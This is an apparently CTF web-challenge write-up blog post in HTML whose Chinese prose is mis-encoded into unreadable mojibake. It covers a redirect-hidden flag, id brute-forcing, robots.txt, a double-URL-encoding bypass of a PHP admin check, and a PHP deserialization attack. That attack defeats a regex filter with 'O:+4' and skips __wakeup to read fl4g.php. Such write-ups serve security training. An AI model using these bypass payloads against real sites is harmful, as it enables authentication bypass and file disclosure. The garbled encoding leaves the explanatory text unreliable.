class="number">2</span> å®šä¹‰è¿è¡Œå¾ªç¯ï¼ˆä»£ç å—ï¼‰çš„æ¡ä»¶ã€‚</span><br><span class="line">è¯­å¥ <span class="number">3</span> ä¼šåœ¨å¾ªç¯ï¼ˆä»£ç å—ï¼‰æ¯æ¬¡è¢«æ‰§è¡Œåæ‰§è¡Œã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)fromCharCode() å¯æ¥å—ä¸€ä¸ªæŒ‡å®šçš„ Unicode å€¼ï¼Œç„¶åè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</span><br><span class="line">è¯­æ³•ï¼šString.fromCharCode(n1, n2, ..., nX)</span><br><span class="line">å‚æ•°                 æè¿°</span><br><span class="line">n1, n2, ..., nX     å¿…éœ€ã€‚ä¸€ä¸ªæˆ–å¤šä¸ª Unicode å€¼ï¼Œå³è¦åˆ›å»ºçš„å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦çš„ Unicode ç¼–ç ã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)<span class="built_in">prompt</span>()æ–¹æ³•ç”¨äºæ˜¾ç¤ºå¯æç¤ºç”¨æˆ·è¿›è¡Œè¾“å…¥çš„å¯¹è¯æ¡†ã€‚</span><br><span class="line">è¿™ä¸ªæ–¹æ³•è¿”å›ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²</span><br><span class="line">è¯­æ³•ï¼š<span class="built_in">prompt</span>(msg,defaultText)</span><br><span class="line">å‚æ•°                æè¿°</span><br><span class="line">msg                å¯é€‰ã€‚è¦åœ¨å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºçš„çº¯æ–‡æœ¬ï¼ˆè€Œä¸æ˜¯ HTML æ ¼å¼çš„æ–‡æœ¬ï¼‰å°±æ˜¯å¼¹æ¡†æ˜¾ç¤ºæ–‡æœ¬ã€‚</span><br><span class="line">defaultText        å¯é€‰ã€‚é»˜è®¤çš„è¾“å…¥æ–‡æœ¬ï¼Œä½ è¾“å…¥ä»€ä¹ˆå¼¹æ¡†ä¸€å¼€å§‹å‡ºç°é‡Œé¢çš„è¾“å…¥æ¡†å°±ä¼šé»˜è®¤æ˜¾ç¤ºä½ è¿™ä¸ªæ–‡æœ¬ã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)<span class="built_in">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">è¿™ä¸ªè¡¨ç¤ºå£°æ˜å˜é‡i,j,k,l,m,n,o,pï¼Œåªæœ‰lå’Œpä¸¤ä¸ªå˜é‡è¢«èµ‹å€¼äº†ï¼Œå…¶å®ƒçš„å˜é‡éƒ½æ˜¯ä¸å¸¦å€¼çš„ï¼Œä¸å¸¦æœ‰å€¼çš„å˜é‡ï¼Œå®ƒçš„å€¼å°†æ˜¯undefinedï¼Œåç»­ä»£ç ä¸­å¯ä»¥ç»™å®ƒèµ‹å€¼ã€‚</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)<span class="built_in">length</span></span><br><span class="line"><span class="built_in">length</span> å±æ€§å¯è®¾ç½®æˆ–è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›®ã€‚</span><br></pre></td></tr></table></figure></div>

<h1 id="Webè¿›é˜¶"><a href="#Webè¿›é˜¶" class="headerlink" title="Webè¿›é˜¶"></a>Webè¿›é˜¶</h1><h2 id="1-baby-web"><a href="#1-baby-web" class="headerlink" title="1.baby_web"></a>1.baby_web</h2><h3 id="1-é¢˜ç›®æè¿°-11"><a href="#1-é¢˜ç›®æè¿°-11" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æƒ³æƒ³åˆå§‹é¡µé¢æ˜¯å“ªä¸ª</p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p> å¼€å§‹ç•Œé¢å¦‚ä¸‹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625162533345.png" alt="image-20220625162533345"></p>
<p>æ²¡æœ‰å¤´ç»ªï¼Œä½†æ˜¯æè¿°é‡Œæœ‰é¦–é¡µï¼Œå†æ ¹æ®urlçŸ¥é“è¿™æ˜¯ä¸ªphpç½‘ç«™</p>
<p>phpç½‘ç«™é¦–é¡µæ–‡ä»¶å°±æ˜¯index.php</p>
<p><code>index.phpæ–‡ä»¶æ˜¯ä¸€ä¸ªphpç½‘ç«™é¦–é¡µæ–‡ä»¶ï¼Œindexæ˜¯æ™®éæ„ä¹‰ä¸Šçš„â€œé¦–é¡µâ€ï¼Œä¹Ÿå°±æ˜¯ä½ è¾“å…¥ä¸€ä¸ªåŸŸååä¼šæ‰“å¼€ä¸€ä¸ªé¡µé¢ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯index.xxxxï¼ˆåŸºæœ¬ä¸Šé¦–é¡µéƒ½ä¸ä¼šæŠŠindex.xxxxæ˜¾ç¤ºåœ¨urlé‡Œï¼Œä½†ä¹Ÿä¸ç»å¯¹ï¼‰</code></p>
<p>è¯•è¯•<code>111.200.241.244:59074/index.php</code></p>
<p>ç»“æœåˆä¼šåˆ°1.phpï¼Œurlåˆå˜æˆ<code>111.200.241.244:59074/1.php</code></p>
<p>F12æ‰“å¼€æŸ¥çœ‹ç½‘ç»œ</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625171731934.png" alt="image-20220625171731934"></p>
<p><code>è¡¥å……ï¼š</code></p>
<p> <code>index.phpçš„çŠ¶æ€æ˜¯302ä»€ä¹ˆæ„æ€ï¼Ÿ</code></p>
<p><code>302 Foundï¼ŒåŸå§‹æè¿°çŸ­è¯­ä¸º Moved Temporarily(ä¸´æ—¶æ¬å®¶ï¼‰ ï¼Œæ˜¯[HTTPåè®®](https://baike.baidu.com/item/HTTPåè®®)ä¸­çš„ä¸€ä¸ªçŠ¶æ€ç (Status Code)ã€‚å¯ä»¥ç®€å•çš„ç†è§£ä¸ºè¯¥èµ„æºåŸæœ¬ç¡®å®å­˜åœ¨ï¼Œä½†å·²ç»è¢«**ä¸´æ—¶**æ”¹å˜äº†ä½ç½®ï¼›æ¢è€Œè¨€ä¹‹ï¼Œå°±æ˜¯è¯·æ±‚çš„èµ„æºæš‚æ—¶é©»ç•™åœ¨ä¸åŒçš„URIä¸‹ï¼Œæ•…è€Œé™¤éç‰¹åˆ«æŒ‡å®šäº†ç¼“å­˜å¤´éƒ¨æŒ‡ç¤ºï¼Œè¯¥çŠ¶æ€ç ä¸å¯ç¼“å­˜ã€‚</code></p>
<p>å‘ç°ç¡®å®æ˜¯è·³è½¬åˆ°äº†index.phpä½†ä¸ºä»€ä¹ˆåˆå›åˆ°1.php</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625171819943.png" alt="image-20220625171819943"></p>
<p>å¯ä»¥çœ‹åˆ°location:1.phpï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ— æ³•ç›´æ¥è®¿é—®index.phpçš„åŸå› ï¼Œä½†flagå·²ç»å¾—åˆ°</p>
<p>å¾—åˆ°flag</p>
<hr>
<p>å¦‚æœç”¨burpsuiteæŸ¥çœ‹<code>111.200.241.244:59074/index.php</code>ï¼Œåªèƒ½çœ‹åˆ°Flag is hidden!ï¼Œä¹Ÿç®—æ˜¯æç¤º</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220625172122211.png" alt="image-20220625172122211"></p>
<h2 id="2-ics-06"><a href="#2-ics-06" class="headerlink" title="2.ics-06"></a>2.ics-06</h2><h3 id="1-é¢˜ç›®æè¿°-12"><a href="#1-é¢˜ç›®æè¿°-12" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>äº‘å¹³å°æŠ¥è¡¨ä¸­å¿ƒæ”¶é›†äº†è®¾å¤‡ç®¡ç†åŸºç¡€æœåŠ¡çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®è¢«åˆ é™¤äº†ï¼Œåªæœ‰ä¸€å¤„ç•™ä¸‹äº†å…¥ä¾µè€…çš„ç—•è¿¹ã€‚</p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3><p>æ‰“å¼€ç•Œé¢æœ‰äº›å“äºº</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626084029917.png" alt="image-20220626084029917"></p>
<p>ä½†åªæœ‰æŠ¥è¡¨ä¸­å¿ƒèƒ½æ‰“å¼€</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626084102777.png" alt="image-20220626084102777"></p>
<p>çœ‹åˆ°urlå°±æœ‰æ€è·¯äº†ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•idçˆ†ç ´</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626084318243.png" alt="image-20220626084318243"></p>
<p>åˆ©ç”¨Numbersæ–¹å¼ï¼Œä»1åˆ°5000ï¼Œå‘ç°2333å¤„æˆåŠŸçˆ†ç ´</p>
<p>å¾—åˆ°flag</p>
<h2 id="3-Training-WWW-Robots"><a href="#3-Training-WWW-Robots" class="headerlink" title="3.Training-WWW-Robots"></a>3.Training-WWW-Robots</h2><h3 id="1-é¢˜ç›®æè¿°-13"><a href="#1-é¢˜ç›®æè¿°-13" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-11"><a href="#2-wp-11" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜å’Œä¸Šé¢æ–°æ‰‹åŒºçš„é¢˜ç±»ä¼¼</p>
<p>å…ˆè®¿é—®<code>http://111.200.241.244:51820/robots.txt</code>å¾—åˆ°phpæ–‡ä»¶å</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626090904204.png" alt="image-20220626090904204"></p>
<p>äºæ˜¯è®¿é—®<code>http://111.200.241.244:51820/fl0g.php/robots.txt</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="4-PHP2"><a href="#4-PHP2" class="headerlink" title="4.PHP2"></a>4.PHP2</h2><h3 id="1-é¢˜ç›®æè¿°-14"><a href="#1-é¢˜ç›®æè¿°-14" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-12"><a href="#2-wp-12" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™å¥è¯çš„æ„æ€æ˜¯â€ä½ èƒ½è¯æ˜è¿™ä¸ªç½‘ç«™å­˜åœ¨å—â€œ</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626104943938.png" alt="image-20220626104943938"></p>
<p>æ²¡æœ‰æ€è·¯ï¼ŒæŠ“åŒ…ï¼Œå’Œå¾¡å‰‘ã€dirsearchéƒ½æ²¡åˆå¾—åˆ°æƒ³è¦çš„ç»“æœ</p>
<p>æ²¡æœ‰åŠæ³•ï¼Œæœäº†ä¸€ä¸‹å¤§ä½¬ä»¬çš„wp</p>
<p>äº†è§£åˆ°äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹phps</p>
<p><code>phpså³ä¸ºPHP Sourceï¼šphpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç æ–‡ä»¶ï¼Œé€šå¸¸ç”¨äºæä¾›ç»™ç”¨æˆ·ï¼ˆè®¿é—®è€…ï¼‰æŸ¥çœ‹phpä»£ç ï¼Œå› ä¸ºç”¨æˆ·æ— æ³•ç›´æ¥é€šè¿‡Webæµè§ˆå™¨çœ‹åˆ°phpæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦ç”¨phpsæ–‡ä»¶ä»£æ›¿ã€‚å…¶å®ï¼Œåªè¦ä¸ç”¨phpç­‰å·²ç»åœ¨æœåŠ¡å™¨ä¸­æ³¨å†Œè¿‡çš„MIMEç±»å‹ä¸ºæ–‡ä»¶å³å¯ï¼Œä½†ä¸ºäº†å›½é™…é€šç”¨ï¼Œæ‰€ä»¥æ‰ç”¨äº†phpsæ–‡ä»¶ç±»å‹ã€‚</code></p>
<p>è®¿é—®<code>http://111.200.241.244:51703/index.phps</code>ï¼Œå¾—åˆ°æºç å†…å®¹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626105416606.png" alt="image-20220626105416606"></p>
<p>å³é”®æŸ¥çœ‹æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure></div>

<p>æ ¹æ®ä»£ç çŸ¥é“ï¼Œå½“id=adminï¼Œè¾“å‡ºnot allowed!ï¼Œä½†æ˜¯æƒ³è¦è¾“å‡ºflag</p>
<p>å°±éœ€è¦æ³¨æ„è¿™å¥è¯­å¥<code>$_GET[id] = urldecode($_GET[id]);</code></p>
<p><code>urldecode:æœ¬å‡½æ•°å¯¹å­—ç¬¦ä¸²è¿›è¡ŒURLè§£ç ã€‚ä¾‹å¦‚é€šè¿‡urlencodeç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œå¯é€šè¿‡UrlDecodeè¿›è¡Œè§£ç ã€‚å¯¹Urlè·¯å¾„åŠ ç çš„å‡½æ•°æ˜¯UrlEncode  ç”¨æ³•ç›¸åï¼Œå’ŒUrlDecodeæ˜¯ä¸€è‡´å¯¹åº”çš„</code></p>
<p>è¿™é‡Œæˆ‘ä»¬å°±æ¸…æ¥šäº†ï¼Œéœ€è¦æŠŠadminè¿›è¡Œurlç¼–ç ï¼Œä½†æ˜¯åªå¯¹å…¶è¿›è¡Œä¸€æ¬¡ç¼–ç ï¼Œè¦çŸ¥é“ç½‘ç«™æœ¬èº«å¯¹urlç¼–ç å°±æœ‰è§£ç çš„èƒ½åŠ›ï¼Œä¹Ÿå°±æ˜¯åœ¨urldecodeå‡½æ•°æ‰§è¡Œä¹‹å‰ï¼Œç½‘ç«™å·²ç»æŠŠç¼–ç è§£ç ä¸ºadminï¼Œä»è€Œåªè¾“å‡ºnot allowed!</p>
<p>æ‰€ä»¥ï¼Œè¿™é‡Œéœ€è¦å¯¹adminè¿›è¡Œä¸¤æ¬¡ç¼–ç ï¼Œç¬¬ä¸€è¢«ç½‘ç«™è§£ç ï¼Œç»•è¿‡ç¬¬ä¸€ä¸ªifï¼Œç„¶ååœ¨urldecodeå‡½æ•°é‡Œè¿›è¡Œç¬¬äºŒæ¬¡è§£ç ï¼Œå˜æˆadminï¼Œä»è€Œè¾“å‡ºKey(flag)</p>
<p>äºæ˜¯è®¿é—®<code>http://111.200.241.244:51703/index.php?id=%25%36%31dmin</code></p>
<p>è¿™é‡Œçš„%25%36%31æ˜¯å­—æ¯açš„äºŒæ¬¡urlç¼–ç ç”±aç¬¬ä¸€æ¬¡ç¼–ç ç»“æœ%61å†æ¬¡ç¼–ç è€Œæˆ</p>
<p>â€“ä¸ºäº†payloadç®€æ´ï¼Œä¸€èˆ¬åªç¼–ç ä¸€ä¸ªå­—æ¯</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626110642311.png" alt="image-20220626110642311"></p>
<p>å¾—åˆ°flag</p>
<h2 id="5-Web-python-template-injection"><a href="#5-Web-python-template-injection" class="headerlink" title="5.Web_python_template_injection"></a>5.Web_python_template_injection</h2><p>è¯¥é¢˜å±äºsstiï¼Œå»ºè®®å…ˆäº†è§£ä¸€äº›<a href="../../../../2022/05/28/Web-study">ssti</a>çš„æ¨¡æ¿æ³¨å…¥ï¼Œå’Œè¿™ä¸¤ç¯‡æ–‡ç« äº†è§£ä¸€äº›flaskè¿è¡ŒåŸç†</p>
<p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a>  </p>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p>ç„¶åå†åšè¿™é“é¢˜</p>
<p><a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">å¤§ä½¬wp</a></p>
<h2 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h2><h3 id="1-é¢˜ç›®æè¿°-15"><a href="#1-é¢˜ç›®æè¿°-15" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-13"><a href="#2-wp-13" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åå­—å¯çŸ¥ï¼Œè¿™æ˜¯é“<a href="../../../../2022/05/28/Web-study">phpååºåˆ—åŒ–</a>ç±»å‹çš„é¢˜</p>
<p>å¼€å§‹å…ˆåˆ†æä¸€ä¸‹phpä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://blog.csdn.net/yanbai3/article/details/122300480">phpä»£ç å®¡è®¡åŸæ–‡é“¾æ¥</a></p>
<p>é¦–å…ˆå®šä¹‰äº†Demoç±»ï¼Œåœ¨ç±»ä¸­å®šä¹‰äº†å‡ ä¸ªæ–¹æ³•<code>construct()wakeup()destruct()</code>ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬è¦çŸ¥é“ï¼Œ</p>
<p>phpä¸­<u><strong>ç±»å®ä¾‹åŒ–çš„æ—¶å€™ï¼Œé¦–å…ˆè¿è¡Œwakeup()å‡½æ•°</strong></u>ï¼Œ</p>
<p>åœ¨<u><strong>åºåˆ—åŒ–æ—¶å…ˆè¿è¡Œsleep()å‡½æ•°</strong></u>,</p>
<p>åœ¨<u><strong>ååºåˆ—åŒ–æ—¶å…ˆè¿è¡Œwakeup()</strong></u>ï¼Œ</p>
<p>åœ¨<u><strong>è„šæœ¬ç»“æŸè°ƒç”¨destruct()å‡½æ•°</strong></u>ã€‚ </p>
<p>ç»§ç»­å®¡è®¡ä»£ç ï¼Œä¸‹é¢çš„<code>if</code>è¯­å¥ä¸­ï¼Œå…ˆç”¨äº†<code>base64</code>çš„è§£ç å‡½æ•°ï¼Œè¿›è¡Œäº†ä¸€æ¬¡è§£ç ï¼Œåˆç”¨ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œè¿‡æ»¤ï¼Œåªæœ‰<code>base64</code>ç¼–ç å¹¶é€šè¿‡æ­£åˆ™è¡¨ç¤ºå¼æ‰èƒ½è¿›è¡Œååºåˆ—åŒ–</p>
<p><img src="https://img-blog.csdnimg.cn/2a59ae6529004d458c4321c9d547fd00.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¿™é‡Œçš„æ­£åˆ™è¡¨è¾¾å¼<code>â€™/[oc]:\d+:/iâ€™</code> è¡¨ç¤ºäº†<code>ä»¥Oæˆ–è€…Cå¼€å¤´</code>æ¥ï¼šæ¥æ•°å­—ï¼Œæ•°å­—è‡³å°‘å‡ºç°ä¸€æ¬¡æˆ–è€…æ— æ•°æ¬¡ï¼Œå¿½ç•¥å¤§å°å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†<code>O:4æ”¹ä¸ºO:+4</code>åˆ™å¯é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œå› ä¸ºåœ¨PHPä»£ç é‡Œï¼Œ<code>+4</code>å°±æ˜¯<code>4</code>ï¼Œæ‰€ä»¥ç»•è¿‡äº†æ­£åˆ™åŒ¹é…åŒæ—¶ä¹Ÿä¸å½±å“ä»£ç æ­£å¸¸å«ä¹‰</p>
<p>è¿™é‡Œçœ‹åˆ°äº†<code>fl4g.php</code>ï¼Œå…ˆæŠŠå®ƒå®ä¾‹åŒ–ï¼Œè¿™é‡Œæ”¹ä¸€ä¸‹ä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿™é‡Œæˆ‘å°±åœ¨æƒ³ï¼Œå¦‚æœè¿™ä¸ªå®ä¾‹åŒ–çš„æ—¶å€™()ä¸åŠ å‚æ•°ï¼Œé‚£ä¹ˆæœ€ååºåˆ—åŒ–çš„ç»“æ„åªèƒ½æ˜¯index.phpï¼Œä¹Ÿå°±æ˜¯æºç ä¸­çš„ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ç›®æ ‡æ˜¯fl4g.phpè¿™ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="comment">//è¿™é‡Œå…¶å®åªéœ€è¦åœ¨å®ä¾‹åŒ–ç±»ä¸­ï¼Œä¼ å…¥æˆ‘ä»¬éœ€è¦åºåˆ—åŒ–çš„å‚æ•°å³å¯</span></span><br><span class="line"><span class="comment">//è¿™é‡Œç›¸å½“äºç»™$flieèµ‹å€¼ï¼Œå¦‚æœç±»ä¸­å¤šä¸ªå€¼éœ€è¦å˜æˆæˆ‘ä»¬éœ€è¦çš„å‚æ•°ï¼Œç”¨&quot;,&quot;éš”å¼€å³å¯ï¼ŒæŒ‰èµ‹å€¼é¡ºåºï¼Œä¾‹å¦‚$a = new Demo(&quot;a&quot;,2,&quot;b&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://tool.lu/coderunner/">è¿è¡ŒPHPä»£ç </a></p>
<p>å¾—åˆ°<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p>è¿™é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ª<code>__wakeup</code>ï¼Œæ‰€ä»¥è¿˜è¦æ”¹ä¸€ä¸‹å±æ€§å€¼<code>1ä¸º2</code></p>
<p>â€“&gt;</p>
<p><code>O:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p><strong>æ³¨æ„ï¼š</strong>è¿™é‡Œæœ‰ä¸€ä¸ªå¤§å‘è®©æˆ‘å¡äº†å¥½ä¹…</p>
<p>å…ˆçœ‹ä¸‹é¢è¿™ä¸ªå›¾ç†è§£ä¸€ä¸‹ä¸Šé¢çš„è¯­å¥</p>
<p><img src="https://img-blog.csdnimg.cn/740796b022bc4fb3a141a1f116467daf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5aSn54Gs55m9,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>å±æ€§å€¼ä¸º10ï¼Œä½†æ˜¯â€<code>Demofile</code>â€œåªæœ‰8ä¸ªå­—ç¬¦ï¼Œå¾ˆæ˜æ˜¾ç¼ºäº†ä¸¤ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯å´è¢«çœç•¥äº†ï¼ŒçŒœæµ‹ç¡®äº†<strong>ä¸¤ä¸ªç©ºå­—ç¬¦</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š<span class="number">0</span>çš„å‰ç¼€ã€‚å­—ç¬¦ä¸²é•¿åº¦ä¹ŸåŒ…æ‹¬æ‰€åŠ å‰ç¼€çš„é•¿åº¦</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä¹Ÿå¯ä»¥æ¨æµ‹å‡ºDemofileæ˜¯<span class="keyword">private</span>å£°æ˜</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæˆ‘ä¸€ç›´å¡ä½çš„<u>åŸå› å°±æ˜¯æŠŠç©ºå­—ç¬¦å½“ä½œäº†ç©ºæ ¼</u></p>
